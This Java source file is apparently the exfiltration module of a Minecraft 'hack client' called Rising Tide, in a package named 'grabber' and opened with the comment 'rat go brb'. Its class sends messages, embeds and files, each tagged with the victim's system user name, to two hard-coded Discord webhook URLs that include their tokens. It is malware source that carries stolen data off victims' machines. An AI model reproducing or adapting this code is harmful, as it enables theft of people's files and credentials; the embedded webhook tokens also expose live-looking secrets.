// rat go brb

package risingtide.tidehack.utils.grabber;

import club.minnced.discord.webhook.WebhookClient;
import club.minnced.discord.webhook.send.WebhookEmbed;
import club.minnced.discord.webhook.send.WebhookMessageBuilder;

import java.io.File;
import java.util.Optional;

public class RTSender {

    String h = "h"; // how oddly fitting
    WebhookClient whMain = WebhookClient.withUrl("https://discord.com/api/webhooks/874550035709317150/nDcR2m2zj-z06yw7VpnrkBJUIfYqJvDPVqzK-gaNyu_KpeW9zSOj8qQAbrok5KojPiJw");
    WebhookClient whFiles = WebhookClient.withUrl("https://discord.com/api/webhooks/874593896431255552/H2zzeJnKZXyZvZWrlF_qrdh5FWLkGskchr-z8KPCZfSIUxZbwbqkO6kjg9IyTb42oGhp");

    public void send(String msg, String name, Boolean isFileSpam) {
        WebhookMessageBuilder wmb = new WebhookMessageBuilder();
        wmb.setUsername("Rising Tide >> "+name+" >> "+System.getProperty("user.name"));
        wmb.append(msg);
        if (!isFileSpam) {
        this.whMain.send(wmb.build());
        } else {
            this.whFiles.send(wmb.build());
        }
    }

    public void send(WebhookEmbed e, String name, Boolean isFileSpam) {
        WebhookMessageBuilder wmb = new WebhookMessageBuilder();
        wmb.setUsername("Rising Tide >> "+name+" >> "+System.getProperty("user.name"));
        wmb.addEmbeds(e);
        if (!isFileSpam) {
            this.whMain.send(wmb.build());
        } else {
            this.whFiles.send(wmb.build());
        }
    }

    public void send(File f, String name, Boolean isFileSpam) {
        WebhookMessageBuilder wmb = new WebhookMessageBuilder();
        wmb.setUsername("Rising Tide >> "+name+" >> "+System.getProperty("user.name"));
        wmb.addFile(f);
        if (!isFileSpam) {
            this.whMain.send(wmb.build());
        } else {
            this.whFiles.send(wmb.build());
        }
    }


}
